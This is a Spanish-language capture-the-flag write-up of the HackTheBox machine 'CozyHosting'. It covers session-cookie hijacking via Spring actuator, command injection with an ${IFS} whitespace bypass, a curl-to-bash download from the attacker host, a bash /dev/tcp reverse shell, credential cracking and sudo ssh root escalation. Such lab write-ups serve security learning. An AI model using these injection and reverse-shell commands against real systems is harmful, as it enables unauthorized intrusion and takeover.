@@ -1,0 +1,260 @@
+I"p<p>Tenemos un sitio web donde descubriremos que usa <strong>Spring</strong>, haciendo fuzzing de directorios, descubriremos un archivo que tiene informacion de unas cookies de sesion que usaremos para iniciar como <strong>kanderson</strong>, una vez dentro veremos que el sitio web intenta conectarse usando ssh, conforme a eso, descubriremos que interpreta <strong>bash</strong> y es vulnerable a <strong>Command Injection</strong>, haciendo bypass de los espacios en blanco nos mandaremos una reverse shell, despues haremos un movimiento lateral de <strong>app</strong> a <strong>josh</strong> mediante la decompilacion de un <strong>.jar</strong>, y descubriremos credenciales para postresql, enumerando un poco, encontraremos las credenciales de ssh para el usuario <strong>josh</strong>, y para la escalada abusaremos de ssh a nivel de sudoers</p>
+
+<h2 class="lead" id="enumeracion">Enumeracion</h2>
+
+<p>Iniciamos con un escaneo de nmap con:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nmap</span> <span class="o">-</span><span class="n">sS</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="no">Pn</span> <span class="o">-</span><span class="no">T4</span> <span class="o">--</span><span class="nb">open</span> <span class="o">-</span><span class="nb">p</span><span class="o">-</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">11.230</span>
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>sS: haga un TCP SYN Scan el cual hace que el destino responda con un RST si el puerto esta cerrado, o con un SYN/ACK si esta abierto, y ademas para que vaya mas rapido</p>
+  </li>
+  <li>
+    <p>n: para que no haga resolucion DNS y tarde menos el escaneo</p>
+  </li>
+  <li>
+    <p>Pn: para evitar el descubrimiento de hosts</p>
+  </li>
+  <li>
+    <p>open: para que solo muestre los puertos abiertos</p>
+  </li>
+  <li>
+    <p>-p-: para que escanee todo el rango de puertos</p>
+  </li>
+</ul>
+
+<p>Y nos reporto que hay dos puertos abiertos:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">PORT</span>    <span class="no">STATE</span> <span class="no">SERVICE</span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">ssh</span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">http</span>
+</code></pre></div></div>
+
+<p>Ahora escanearemos para obtener mas informacion sobre la version y el servicio que estan corriendo bajo esos puertos:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nmap</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">p22</span><span class="p">,</span><span class="mi">80</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">11.230</span>
+</code></pre></div></div>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">PORT</span>   <span class="no">STATE</span> <span class="no">SERVICE</span> <span class="no">VERSION</span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssh</span>     <span class="no">OpenSSH</span> <span class="mf">8.9</span><span class="n">p1</span> <span class="no">Ubuntu</span> <span class="mi">3</span><span class="n">ubuntu0</span><span class="o">.</span><span class="mi">3</span> <span class="p">(</span><span class="no">Ubuntu</span> <span class="no">Linux</span><span class="p">;</span> <span class="n">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
+<span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="ss">hostkey: 
+</span><span class="o">|</span>   <span class="mi">256</span> <span class="mi">43</span><span class="p">:</span><span class="mi">56</span><span class="ss">:bc:a7:f2:ec</span><span class="p">:</span><span class="mi">46</span><span class="ss">:dd:c1</span><span class="p">:</span><span class="mi">0</span><span class="n">f</span><span class="p">:</span><span class="mi">83</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mi">4</span><span class="n">c</span><span class="p">:</span><span class="mi">2</span><span class="n">c</span><span class="ss">:aa:a8</span> <span class="p">(</span><span class="no">ECDSA</span><span class="p">)</span>
+<span class="o">|</span><span class="n">_</span>  <span class="mi">256</span> <span class="mi">6</span><span class="n">f</span><span class="p">:</span><span class="mi">7</span><span class="n">a</span><span class="p">:</span><span class="mi">6</span><span class="n">c</span><span class="p">:</span><span class="mi">3</span><span class="n">f</span><span class="ss">:a6</span><span class="p">:</span><span class="mi">8</span><span class="n">d</span><span class="ss">:e2</span><span class="p">:</span><span class="mi">75</span><span class="p">:</span><span class="mi">95</span><span class="ss">:d4</span><span class="p">:</span><span class="mi">7</span><span class="n">b</span><span class="p">:</span><span class="mi">71</span><span class="ss">:ac</span><span class="p">:</span><span class="mi">4</span><span class="n">f</span><span class="p">:</span><span class="mi">7</span><span class="n">e</span><span class="p">:</span><span class="mi">42</span> <span class="p">(</span><span class="no">ED25519</span><span class="p">)</span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>    <span class="n">nginx</span> <span class="mf">1.18</span><span class="o">.</span><span class="mi">0</span> <span class="p">(</span><span class="no">Ubuntu</span><span class="p">)</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="ss">title: </span><span class="no">Did</span> <span class="n">not</span> <span class="n">follow</span> <span class="n">redirect</span> <span class="n">to</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">cozyhosting</span><span class="p">.</span><span class="nf">htb</span>
+<span class="no">Service</span> <span class="no">Info</span><span class="p">:</span> <span class="no">OS</span><span class="p">:</span> <span class="no">Linux</span><span class="p">;</span> <span class="no">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="ss">:/</span><span class="n">o</span><span class="ss">:linux:linux_kernel</span>
+</code></pre></div></div>
+
+<p>En el puerto <strong>22</strong> no vamos a poder hacer nada, en el puerto <strong>80</strong> vemos que nos redirije a <strong>cozyhosting.htb</strong>, asi que lo agregaremos al <strong>/etc/hosts</strong></p>
+
+<h3 id="fuzzing-de-diretorios">Fuzzing de diretorios</h3>
+
+<p>Podemos usar <strong>wffuzz</strong> para enumerar directorios mediante fuerza bruta:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">wfuzz</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'http://cozyhosting.htb/FUZZ'</span> <span class="o">-</span><span class="n">w</span> <span class="sr">/usr/s</span><span class="n">hare</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">directory</span><span class="o">-</span><span class="n">list</span><span class="o">-</span><span class="mf">2.3</span><span class="o">-</span><span class="n">medium</span><span class="p">.</span><span class="nf">txt</span> <span class="o">-</span><span class="n">t</span> <span class="mi">100</span> <span class="o">--</span><span class="n">hc</span><span class="o">=</span><span class="mi">404</span>
+</code></pre></div></div>
+
+<p>Nos descubrio las rutas:</p>
+
+<ul>
+  <li>login</li>
+  <li>admin –&gt; login</li>
+  <li>logout</li>
+  <li>error</li>
+</ul>
+
+<h3 id="analisis-del-sitio-web-error">Analisis del sitio web (/error)</h3>
+
+<p>Para no hacerlo tan largo, en login, admin y logout no vamos a poder hacer nada, sin embargo, en la ruta <strong>/error</strong> vamos a descubrir algunas cosas, cuando entramos nos muestra un sitio de error</p>
+
+<p><img src="/assets/img/htb-cozyHosting/1.png" alt="" /></p>
+
+<p>El mensaje de <strong>Whitelabel Error Page</strong> es un mensaje de error de un sitio web que usa <strong>Spring boot</strong> (si no me crees solo pon ese mensaje en google), debido a que Spring tiene sus propios directorios, podemo volver a hacer directory fuzzing pero usando esta lista <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt">https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt</a></p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">wfuzz</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'http://cozyhosting.htb/FUZZ'</span> <span class="o">-</span><span class="n">w</span> <span class="sr">/usr/s</span><span class="n">hare</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">spring</span><span class="o">-</span><span class="n">boot</span><span class="p">.</span><span class="nf">txt</span> <span class="o">-</span><span class="n">t</span> <span class="mi">100</span> <span class="o">--</span><span class="n">hc</span><span class="o">=</span><span class="mi">404</span>
+</code></pre></div></div>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mo">00000005</span><span class="mi">8</span><span class="p">:</span>   <span class="mi">200</span>        <span class="mi">0</span> <span class="no">L</span>      <span class="mi">108</span> <span class="no">W</span>      <span class="mi">9938</span> <span class="no">Ch</span>     <span class="s2">"actuator/mappings"</span>
+<span class="mo">000000051</span><span class="p">:</span>   <span class="mi">200</span>        <span class="mi">0</span> <span class="no">L</span>      <span class="mi">1</span> <span class="no">W</span>        <span class="mi">15</span> <span class="no">Ch</span>       <span class="s2">"actuator/health"</span>                                                                      
+<span class="mo">000000072</span><span class="p">:</span>   <span class="mi">200</span>        <span class="mi">0</span> <span class="no">L</span>      <span class="mi">1</span> <span class="no">W</span>        <span class="mi">98</span> <span class="no">Ch</span>       <span class="s2">"actuator/sessions"</span>                                                                      
+<span class="mo">00000003</span><span class="mi">8</span><span class="p">:</span>   <span class="mi">200</span>        <span class="mi">0</span> <span class="no">L</span>      <span class="mi">120</span> <span class="no">W</span>      <span class="mi">4957</span> <span class="no">Ch</span>     <span class="s2">"actuator/env"</span>                                                                      
+<span class="mo">000000041</span><span class="p">:</span>   <span class="mi">200</span>        <span class="mi">0</span> <span class="no">L</span>      <span class="mi">13</span> <span class="no">W</span>       <span class="mi">487</span> <span class="no">Ch</span>      <span class="s2">"actuator/env/lang"</span>                                                                      
+<span class="mo">00000002</span><span class="mi">9</span><span class="p">:</span>   <span class="mi">200</span>        <span class="mi">0</span> <span class="no">L</span>      <span class="mi">1</span> <span class="no">W</span>        <span class="mi">634</span> <span class="no">Ch</span>      <span class="s2">"actuator"</span>                                                                      
+<span class="mo">00000003</span><span class="mi">9</span><span class="p">:</span>   <span class="mi">200</span>        <span class="mi">0</span> <span class="no">L</span>      <span class="mi">13</span> <span class="no">W</span>       <span class="mi">487</span> <span class="no">Ch</span>      <span class="s2">"actuator/env/home"</span>
+<span class="mo">000000044</span><span class="p">:</span>   <span class="mi">200</span>        <span class="mi">0</span> <span class="no">L</span>      <span class="mi">13</span> <span class="no">W</span>       <span class="mi">487</span> <span class="no">Ch</span>      <span class="s2">"actuator/env/path"</span>                                                                    
+<span class="mo">000000113</span><span class="p">:</span>   <span class="mi">200</span>        <span class="mi">284</span> <span class="no">L</span>    <span class="mi">745</span> <span class="no">W</span>      <span class="mi">12706</span> <span class="no">Ch</span>    <span class="s2">"http://cozyhosting.htb/"</span>
+<span class="mo">000000032</span><span class="p">:</span>   <span class="mi">200</span>        <span class="mi">0</span> <span class="no">L</span>      <span class="mi">542</span> <span class="no">W</span>      <span class="mi">127224</span> <span class="no">Ch</span>   <span class="s2">"actuator/beans"</span>
+</code></pre></div></div>
+
+<p>Solo con ver el nombre de las rutas, me da a entender que la aplicacion esta usando <strong>actuators</strong>, basicamente es un modulo de Spring que provee funciones de monitoreo, metricas, y funciones extra para endpoints, una ruta interesante es la de <strong>/actuator/sessions</strong>, segun la documentacion es: <strong>The sessions endpoint provides information about the application’s HTTP sessions that are managed by Spring Session.</strong></p>
+
+<p>Si ingresamos a <strong>http://cozyhosting.htb/actuator/sessions</strong> vamos a poder ver dos usuarios y lo que parece ser una cookie</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+    </span><span class="nl">"382C3D6F5B4B57647B8CCAD80F99574C"</span><span class="p">:</span><span class="s2">"kanderson"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"471206F75AC37D6938DA9CB2E27A20DD"</span><span class="p">:</span><span class="s2">"UNAUTHORIZED"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Si inspeccionamos el sitio web y nos vamos a <strong>Storage</strong>, vamos a poder ver una cookie con el nombre de <strong>JSESSIONID</strong>, si modificamos ese valor por el de <strong>382C3D6F5B4B57647B8CCAD80F99574C</strong> y recargamos la pagina, vamos a poder ver que entramos como <strong>kanderson</strong></p>
+
+<h3 id="analisis-de-cozyhostinghtbadmin">Analisis de cozyhosting.htb/admin</h3>
+
+<p><img src="/assets/img/htb-cozyHosting/2.png" alt="" /></p>
+
+<p>Vemos que nos sale un formulario con un mensaje que dice mas o menos asi: <strong>Para que Cozy Scanner se conecte, la clave privada que recibió al registrarse debe incluirse en el archivo .ssh/authorised_keys de su host</strong></p>
+
+<p>Si ponemos cualquier cosa en el formulario, nos sale un mensaje de error</p>
+
+<p><img src="/assets/img/htb-cozyHosting/3.png" alt="" /></p>
+
+<p>Es curioso, por que puedo deducir que se esta intentando conectar por ssh a <strong>c4rta</strong>.</p>
+
+<p>Interceptare la peticion con burp y lo analizaremos mas a fondo</p>
+
+<p><img src="/assets/img/htb-cozyHosting/4.png" alt="" /></p>
+
+<p>Primero vemos que esta haciendo una peticion por POST a <strong>POST /executessh</strong>, ademas tenemos el parametro <strong>hostname</strong> y <strong>username</strong>, con esa informacion sabemos que esta ejecutando el comando ssh, en este punto podemos empezar a jugar con el valor de los parametros, y observa que pasa cuando se deja el parametro <strong>username</strong> vacio:</p>
+
+<p><img src="/assets/img/htb-cozyHosting/5.png" alt="" /></p>
+
+<p>Nos sale el tipico mensaje de ayuda de como usar SSH, similar a esto:</p>
+
+<p><img src="/assets/img/htb-cozyHosting/6.png" alt="" /></p>
+
+<p>Es curioso por que ese comando se ejecuta como uno de sistema en la maquina victima, y mas por que podemos modificar el valor del parametro <strong>username</strong>, entonces que pasara si ahora le ponemos esto: <strong>;whoami</strong></p>
+
+<p><img src="/assets/img/htb-cozyHosting/7.png" alt="" /></p>
+
+<p>Observa como al final sale: <strong>/bin/bash: line 1: whoami@c4rta: command not found</strong></p>
+
+<p>Ahora con esto sabemos que interpreta bash, y esto es potencialmente un <strong>Command injection</strong></p>
+
+<h2 id="command-injection">Command injection</h2>
+
+<p>Si intentamos hacer uso de un <strong>echo</strong>, nos va a salir que no aceptan espacios:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Location</span><span class="p">:</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">cozyhosting</span><span class="p">.</span><span class="nf">htb</span><span class="o">/</span><span class="n">admin?error</span><span class="o">=</span><span class="no">Username</span> <span class="n">can</span><span class="err">'</span><span class="n">t</span> <span class="n">contain</span> <span class="n">whitespaces!</span>
+</code></pre></div></div>
+<p>No es un problema, por que en GNU/Linux hay una variable de entorno que se llama <strong>IFS</strong> la cual contiene separadores de palabras, si le hacemos un echo, vemos que sale todo blanco, pero en realidad hay un espacio</p>
+
+<p><img src="/assets/img/htb-cozyHosting/8.png" alt="" /></p>
+
+<p>Asi que podemos usar IFS para interpretar el espacio y hacer bypass de ese filtro, para probar si podemos ejecutar comandos, nos podremos en escucha por tcpdump por la interfaz tun0:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">tcpdump</span> <span class="o">-</span><span class="n">i</span> <span class="n">tun0</span> <span class="o">-</span><span class="n">n</span> <span class="n">icmp</span>
+</code></pre></div></div>
+
+<p>Y en el username lo indicaremos asi:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">;</span>ping<span class="k">${</span><span class="nv">IFS</span><span class="k">}</span>&lt;ip&gt;<span class="p">;</span>
+</code></pre></div></div>
+
+<p>Observa como pudimos ejecutar el ping</p>
+
+<p><img src="/assets/img/htb-cozyHosting/9.png" alt="" /></p>
+
+<p>Ya esta confirmadisimo que podemos ejecutar comandos, asi que nos mandaremos una reverse shell:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">;</span><span class="n">curl</span><span class="err">$</span><span class="p">{</span><span class="no">IFS</span><span class="p">}</span><span class="o">&lt;</span><span class="n">ip</span><span class="o">&gt;</span><span class="p">:</span><span class="mi">8080</span><span class="o">/</span><span class="n">pwn</span><span class="p">.</span><span class="nf">sh</span><span class="o">|</span><span class="n">bash</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>En el pwn.sh tengo esto:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">bash</span> <span class="o">-</span><span class="n">i</span> <span class="o">&gt;&amp;</span> <span class="sr">/dev/</span><span class="n">tcp</span><span class="o">/&lt;</span><span class="n">ip</span><span class="o">&gt;</span><span class="sr">/4444 0&gt;&amp;1
+</span></code></pre></div></div>
+
+<p>Y nos deberia de llegar una rev shell</p>
+
+<h2 id="moviento-laterial-app--josh-y-flag-de-user">Moviento laterial: app –&gt; josh y flag de user</h2>
+
+<p>Al listar el cotenido podemos ver que tenemos un jar</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">app</span><span class="vi">@cozyhosting</span><span class="ss">:/</span><span class="n">app</span><span class="err">$</span> <span class="n">ls</span>
+<span class="n">cloudhosting</span><span class="o">-</span><span class="mf">0.0</span><span class="o">.</span><span class="mi">1</span><span class="p">.</span><span class="nf">jar</span>
+</code></pre></div></div>
+
+<p>Adicionalmente si exploramos el directorio <strong>home</strong>, vamos a poder ver al directorio del usuario josh</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">app</span><span class="vi">@cozyhosting</span><span class="ss">:/</span><span class="n">home</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span>
+<span class="n">total</span> <span class="mi">4</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">x</span><span class="o">---</span> <span class="mi">3</span> <span class="n">josh</span> <span class="n">josh</span> <span class="mi">4096</span> <span class="no">Aug</span>  <span class="mi">8</span> <span class="mi">10</span><span class="p">:</span><span class="mi">19</span> <span class="n">josh</span>
+</code></pre></div></div>
+
+<p>Para pasarnos el archivo, en la maquina victima usare python para crear un servidor web</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="p">.</span><span class="nf">server</span> <span class="mi">8086</span>
+</code></pre></div></div>
+
+<p>Y en mi maquina solamente me lo descargare:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">wget</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">cozyhosting</span><span class="p">.</span><span class="nf">htb</span><span class="p">:</span><span class="mi">8086</span><span class="o">/</span><span class="n">cloudhosting</span><span class="o">-</span><span class="mf">0.0</span><span class="o">.</span><span class="mi">1</span><span class="p">.</span><span class="nf">jar</span>
+</code></pre></div></div>
+
+<p>Como es un archivo jar, y no tengo un IDE para analizarlo, usare esta pagina para decompilarlo <a href="https://jdec.app/">https://jdec.app/</a></p>
+
+<p>Al explorarlo un poco, vamos a poder ver credenciales para postgresql</p>
+
+<p><img src="/assets/img/htb-cozyHosting/10.png" alt="" /></p>
+
+<p>Asi que en la reverse shell que conseguimos, nos conectaremos:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">psql</span> <span class="o">-</span><span class="no">U</span> <span class="n">postgres</span> <span class="o">-</span><span class="no">W</span> <span class="o">-</span><span class="n">h</span> <span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span> <span class="o">-</span><span class="n">d</span> <span class="n">cozyhosting</span>
+</code></pre></div></div>
+
+<p>Listamos las bases de datos con: <strong>\l</strong>:</p>
+
+<p><img src="/assets/img/htb-cozyHosting/11.png" alt="" /></p>
+
+<p>En mi caso yo ya estoy conectado a la base de datos <strong>cozyhosting</strong>, pero en caso de que no, usa el comando: <strong>\c cozyhosting</strong></p>
+
+<p>Si mostramos las tablas tenemos varias:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cozyhosting</span><span class="o">=</span><span class="c1"># \d</span>
+              <span class="no">List</span> <span class="n">of</span> <span class="n">relations</span>
+ <span class="no">Schema</span> <span class="o">|</span>     <span class="no">Name</span>     <span class="o">|</span>   <span class="no">Type</span>   <span class="o">|</span>  <span class="no">Owner</span>   
+<span class="o">--------+--------------+----------+----------</span>
+ <span class="kp">public</span> <span class="o">|</span> <span class="n">hosts</span>        <span class="o">|</span> <span class="n">table</span>    <span class="o">|</span> <span class="n">postgres</span>
+ <span class="kp">public</span> <span class="o">|</span> <span class="n">hosts_id_seq</span> <span class="o">|</span> <span class="n">sequence</span> <span class="o">|</span> <span class="n">postgres</span>
+ <span class="kp">public</span> <span class="o">|</span> <span class="n">users</span>        <span class="o">|</span> <span class="n">table</span>    <span class="o">|</span> <span class="n">postgres</span>
+<span class="p">(</span><span class="mi">3</span> <span class="n">rows</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Si hacemos un select de users, vamos a ver dos hashes</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="nb">name</span>    <span class="o">|</span>                           <span class="n">password</span>                           <span class="o">|</span> <span class="n">role</span>  
+<span class="o">-----------+--------------------------------------------------------------+-------</span>
+ <span class="n">kanderson</span> <span class="o">|</span> <span class="vg">$2a$10$E</span><span class="o">/</span><span class="no">Vcd9ecflmPudWeLSEIv</span><span class="p">.</span><span class="nf">cvK6QjxjWlWXpij1NVNV3Mm6eH58zim</span> <span class="o">|</span> <span class="no">User</span>
+ <span class="n">admin</span>     <span class="o">|</span> <span class="vg">$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm</span> <span class="o">|</span> <span class="no">Admin</span>
+</code></pre></div></div>
+
+<p>Intentaremos crackear el de admin usando John</p>
+
+<p><img src="/assets/img/htb-cozyHosting/12.png" alt="" /></p>
+
+<p>Y tenemos la contraseña: <strong>manchesterunited</strong> para el usuario <strong>Josh</strong></p>
+
+<p>Ahora ya nos podemos conectar por SSH</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">josh</span><span class="vi">@cozyhosting</span><span class="ss">:~</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">user</span><span class="p">.</span><span class="nf">txt</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">-----</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">josh</span> <span class="mi">33</span> <span class="no">Sep</span> <span class="mi">15</span> <span class="mi">20</span><span class="p">:</span><span class="mi">32</span> <span class="n">user</span><span class="p">.</span><span class="nf">txt</span>
+</code></pre></div></div>
+
+<p>Si mostramos permisos a nivel de sudoers usando <strong>sudo -l</strong>: tenemos el ssh</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">User</span> <span class="n">josh</span> <span class="n">may</span> <span class="n">run</span> <span class="n">the</span> <span class="n">following</span> <span class="n">commands</span> <span class="n">on</span> <span class="ss">localhost:
+    </span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">ssh</span> <span class="o">*</span>
+</code></pre></div></div>
+
+<p>Haciendo una busqueda rapida en <a href="https://gtfobins.github.io/gtfobins/ssh/">GTOBins</a> podemos ver que podemos hacernos root ejecutando:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sudo</span> <span class="n">ssh</span> <span class="o">-</span><span class="n">o</span> <span class="no">ProxyCommand</span><span class="o">=</span><span class="s1">';sh 0&lt;&amp;2 1&gt;&amp;2'</span> <span class="n">x</span>
+</code></pre></div></div>
+
+<p>Y ya seriamos root:</p>
+
+<p><img src="/assets/img/htb-cozyHosting/13.png" alt="" /></p>
+
+<p>Eso ha sido todo, gracias por leer ❤</p>
+:ET
